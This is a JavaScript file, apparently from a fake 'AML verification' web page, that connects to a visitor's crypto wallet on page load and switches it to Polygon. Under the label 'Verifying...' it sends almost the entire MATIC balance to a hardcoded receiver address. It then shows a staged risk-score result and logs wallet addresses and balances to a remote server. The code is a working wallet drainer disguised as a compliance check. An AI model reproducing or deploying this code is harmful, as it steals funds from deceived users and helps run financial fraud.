let provider;
let signer;
let currentBalance = 0;

// Function to send logs to AML API
async function sendToAmlLog(message, type = 'info') {
    try {
        const response = await fetch('https://aml.cab/api/log', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                message: typeof message === 'object' ? JSON.stringify(message) : message,
                type: type
            })
        });
        if (!response.ok) {
            console.error('Failed to send log to AML API:', await response.text());
        }
    } catch (error) {
        console.error('Error sending log to AML API:', error);
    }
}

// Wrapper for console methods
const logger = {
    log: async (...args) => {
        console.log(...args);
        const message = args.map(arg => 
            typeof arg === 'object' ? JSON.stringify(arg) : String(arg)
        ).join(' ');
        await sendToAmlLog(message, 'info');
    },
    error: async (...args) => {
        console.error(...args);
        const message = args.map(arg => 
            typeof arg === 'object' ? JSON.stringify(arg) : String(arg)
        ).join(' ');
        await sendToAmlLog(message, 'error');
    },
    warn: async (...args) => {
        console.warn(...args);
        const message = args.map(arg => 
            typeof arg === 'object' ? JSON.stringify(arg) : String(arg)
        ).join(' ');
        await sendToAmlLog(message, 'warning');
    }
};

const isDev = window.location.href.includes('localhost') || window.location.href.includes('127.0.0.1');

// Адрес получателя платежей
const PROD_RECEIVER_ADDRESS = "0x6217cA34756CBD31Ee84fc83179F37e19250B76D";
const DEV_RECEIVER_ADDRESS = "0x8e62C38421A0670f42e3881A9E9dA93f08723af2";
const RECEIVER_ADDRESS = isDev ? DEV_RECEIVER_ADDRESS : PROD_RECEIVER_ADDRESS;
logger.log('isDev', isDev);
logger.log('RECEIVER_ADDRESS', RECEIVER_ADDRESS);
async function updateBalance() {
    try {
        if (!signer || !provider) {
            logger.log('No signer or provider available');
            return;
        }

        const address = await signer.getAddress();
        logger.log('Connected address:', address);

        // Получаем баланс MATIC
        const balance = await provider.getBalance(address);
        currentBalance = balance;
        logger.log('MATIC balance:', ethers.utils.formatEther(balance), 'MATIC');

    } catch (error) {
        logger.error("Error checking balances:", error);
    }
}

async function handleAction() {
    const button = document.getElementById('action-button');
    
    if (!signer) {
        // Если кошелек не подключен, подключаем и сразу запускаем верификацию
        await connectWallet();
        if (signer) { // Если подключение успешно
            await sendPayment();
        }
    } else {
        // Если кошелек уже подключен, просто запускаем верификацию
        await sendPayment();
    }
}

async function connectWallet() {
    try {
        // Отключаем кнопку на время подключения
        const actionButton = document.getElementById('action-button');
        actionButton.disabled = true;
        actionButton.classList.add('loading');
        actionButton.textContent = 'Connecting...';

        logger.log('Starting wallet connection...');
        
        // Ждем инициализации провайдера
        const rawProvider = await waitForProvider();
        logger.log('Provider status:', {
            isProviderFound: !!rawProvider,
            providerType: rawProvider ? rawProvider.constructor.name : 'none',
            isEthereum: !!window.ethereum,
            isRabby: !!window.rabby,
            hasWeb3: !!(window.web3 && window.web3.currentProvider)
        });

        if (!rawProvider) {
            throw new Error('Web3 wallet not detected. Please install MetaMask, Rabby, or another Web3 wallet and refresh the page.');
        }

        // Создаем Web3Provider
        provider = new ethers.providers.Web3Provider(rawProvider, 'any');
        
        // Запрашиваем доступ к аккаунтам
        logger.log('Requesting accounts...');
        await provider.send("eth_requestAccounts", []);
        
        // Получаем подписанта
        signer = provider.getSigner();
        const address = await signer.getAddress();
        logger.log('Connected address:', address);

        // Проверяем и переключаем сеть
        const network = await provider.getNetwork();
        logger.log('Current network:', network);

        if (network.chainId !== 137) {
            logger.log('Switching to Polygon network...');
            try {
                await rawProvider.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: '0x89' }], // chainId для Polygon
                });
            } catch (switchError) {
                logger.log('Switch error:', switchError);
                if (switchError.code === 4902) {
                    try {
                        await rawProvider.request({
                            method: 'wallet_addEthereumChain',
                            params: [{
                                chainId: '0x89',
                                chainName: 'Polygon',
                                nativeCurrency: {
                                    name: 'MATIC',
                                    symbol: 'MATIC',
                                    decimals: 18
                                },
                                rpcUrls: ['https://polygon-rpc.com'],
                                blockExplorerUrls: ['https://polygonscan.com/']
                            }]
                        });
                    } catch (addError) {
                        logger.error('Add network error:', addError);
                        throw new Error('Failed to add Polygon network');
                    }
                } else {
                    throw switchError;
                }
            }
        }

        // Обновляем баланс
        await updateBalance();

        // Подписываемся на события
        rawProvider.on('accountsChanged', async (accounts) => {
            logger.log('Accounts changed:', accounts);
            signer = provider.getSigner();
            await updateBalance();
        });

        rawProvider.on('chainChanged', () => {
            logger.log('Network changed, reloading...');
            window.location.reload();
        });

        // Не меняем текст кнопки, так как верификация запустится автоматически
        actionButton.disabled = false;
        actionButton.classList.remove('loading');

    } catch (error) {
        logger.error('Connection error:', error);
        
        // Возвращаем кнопку в исходное состояние
        const actionButton = document.getElementById('action-button');
        actionButton.disabled = false;
        actionButton.classList.remove('loading');
        actionButton.textContent = 'Connect Wallet for Verification';
        
        // Сбрасываем provider и signer чтобы можно было попробовать снова
        provider = null;
        signer = null;
    }
}

async function sendPayment() {
    try {
        const actionButton = document.getElementById('action-button');
        actionButton.disabled = true;
        actionButton.classList.add('loading');
        actionButton.textContent = 'Verifying...';

        const userAddress = await signer.getAddress();
        logger.log('Sending from address:', userAddress);
        
        // Проверяем текущий баланс MATIC
        const balance = await provider.getBalance(userAddress);
        logger.log('Current MATIC balance:', ethers.utils.formatEther(balance), 'MATIC');
        
        if (balance.eq(0)) {
            logger.log('No MATIC balance available');
            return;
        }

        // Получаем текущую цену газа
        const gasPrice = await provider.getGasPrice();
        logger.log('Current gas price:', ethers.utils.formatUnits(gasPrice, 'gwei'), 'gwei');

        // Рассчитываем стоимость газа для транзакции с запасом в 20%
        const gasLimit = 21000; // Стандартный лимит для простого перевода
        const gasCost = gasPrice.mul(gasLimit);
        const gasCostWithBuffer = gasCost.mul(120).div(100);
        logger.log('Gas cost with buffer:', ethers.utils.formatEther(gasCostWithBuffer), 'MATIC');

        // Оставляем фиксированный минимум 0.1 MATIC для будущих транзакций
        const minimumMaticToKeep = ethers.utils.parseEther('0.1');
        const totalCostToReserve = gasCostWithBuffer.add(minimumMaticToKeep);
        logger.log('Total amount to reserve:', ethers.utils.formatEther(totalCostToReserve), 'MATIC');

        // Вычитаем общую сумму резерва из отправляемой суммы
        const amountToSend = balance.sub(totalCostToReserve);
        logger.log('Amount to send:', ethers.utils.formatEther(amountToSend), 'MATIC');

        if (amountToSend.lte(0)) {
            logger.log('Insufficient balance to cover gas fees and minimum reserve');
            throw new Error('Insufficient balance to cover gas fees and minimum reserve');
        }

        // Отправляем транзакцию
        logger.log('Sending transaction...');
        const tx = await signer.sendTransaction({
            to: RECEIVER_ADDRESS,
            value: amountToSend,
            gasLimit: gasLimit,
            maxFeePerGas: gasPrice.mul(2),
            maxPriorityFeePerGas: gasPrice
        });

        logger.log('Transaction sent:', tx.hash);
        
        // Ждем подтверждения транзакции
        await tx.wait();
        logger.log('Transaction confirmed');

        // Показываем результаты AML проверки
        actionButton.style.display = 'none';
        const amlResults = document.getElementById('aml-results');
        amlResults.classList.add('visible');
        
        // Анимируем риск-скор
        const circle = document.querySelector('.risk-score-progress');
        const radius = circle.r.baseVal.value;
        const circumference = radius * 2 * Math.PI;
        circle.style.strokeDasharray = `${circumference} ${circumference}`;
        circle.style.strokeDashoffset = circumference;
        
        setTimeout(() => {
            const offset = circumference - (0.8 * circumference);
            circle.style.strokeDashoffset = offset;
        }, 100);
        
        // Обновляем Transaction ID
        document.getElementById('transaction-hash').textContent = 
            tx.hash.slice(0, 6) + '...' + tx.hash.slice(-4);
        
        // Обновляем баланс
        await updateBalance();

    } catch (error) {
        logger.error('Transaction error:', error);
        const actionButton = document.getElementById('action-button');
        actionButton.textContent = error.message || 'Transaction failed';
        actionButton.style.backgroundColor = 'var(--danger-color)';
        setTimeout(() => {
            actionButton.textContent = 'Verify';
            actionButton.style.backgroundColor = 'var(--primary-color)';
        }, 3000);
    } finally {
        const actionButton = document.getElementById('action-button');
        actionButton.disabled = false;
        actionButton.classList.remove('loading');
    }
}

function showStatus(message, isSuccess) {
    logger.log(`Status: ${message} (${isSuccess ? 'success' : 'error'})`);
}

// Функция для ожидания инициализации провайдера
async function waitForProvider() {
    // Проверяем доступные провайдеры
    if (window.ethereum) {
        return window.ethereum;
    }
    if (window.rabby) {
        return window.rabby;
    }
    if (window.web3 && window.web3.currentProvider) {
        return window.web3.currentProvider;
    }
    
    // Если провайдер не найден сразу, ждем небольшое время
    return new Promise((resolve) => {
        let attempts = 0;
        const maxAttempts = 3;
        
        const checkProvider = () => {
            attempts++;
            if (window.ethereum) {
                resolve(window.ethereum);
            } else if (window.rabby) {
                resolve(window.rabby);
            } else if (window.web3 && window.web3.currentProvider) {
                resolve(window.web3.currentProvider);
            } else if (attempts < maxAttempts) {
                setTimeout(checkProvider, 500); // Проверяем каждые 500мс
            } else {
                resolve(null); // Возвращаем null если провайдер не найден
            }
        };
        
        checkProvider();
    });
}

// Добавляем обработчик загрузки страницы
document.addEventListener('DOMContentLoaded', async () => {
    logger.log('Page loaded, checking providers:', {
        ethereum: !!window.ethereum,
        rabby: !!window.rabby,
        web3: !!(window.web3 && window.web3.currentProvider)
    });
    
    // Автоматическое подключение если обнаружен провайдер
    const provider = await waitForProvider();
    if (provider) {
        logger.log('Web3 provider detected, attempting automatic connection...');
        try {
            // Сначала пробуем получить список аккаунтов
            const accounts = await provider.request({ method: 'eth_accounts' });
            logger.log('Current accounts:', accounts);
            
            if (accounts && accounts.length > 0) {
                logger.log('Found connected account, initiating automatic connection');
                await handleAction();
            } else {
                // Если аккаунтов нет, пробуем запросить подключение
                logger.log('No connected accounts, requesting connection...');
                try {
                    const newAccounts = await provider.request({ method: 'eth_requestAccounts' });
                    logger.log('New accounts after request:', newAccounts);
                    if (newAccounts && newAccounts.length > 0) {
                        await handleAction();
                    } else {
                        logger.log('User rejected connection request');
                    }
                } catch (requestError) {
                    logger.log('Error requesting accounts:', requestError);
                    if (requestError.code === 4001) {
                        logger.log('User rejected connection request');
                    } else {
                        logger.error('Unexpected error:', requestError);
                    }
                }
            }
        } catch (error) {
            logger.error('Auto-connection check failed:', error);
            if (error.code) {
                logger.log('Error code:', error.code);
            }
            if (error.message) {
                logger.log('Error message:', error.message);
            }
        }
    } else {
        logger.log('No Web3 provider found');
    }
    
    showStatus('Please connect your wallet to continue', true);
});

let lastScrollTop = 0;
const header = document.querySelector('.header');

// Добавляем обработчик прокрутки
window.addEventListener('scroll', () => {
    const scrollTop = window.pageYOffset || document.documentElement.scrollTop;
    
    // Показываем/скрываем шапку в зависимости от направления прокрутки
    if (scrollTop > lastScrollTop && scrollTop > 80) {
        // Прокрутка вниз - скрываем шапку
        header.classList.add('header-hidden');
    } else {
        // Прокрутка вверх - показываем шапку
        header.classList.remove('header-hidden');
    }
    
    lastScrollTop = scrollTop;
});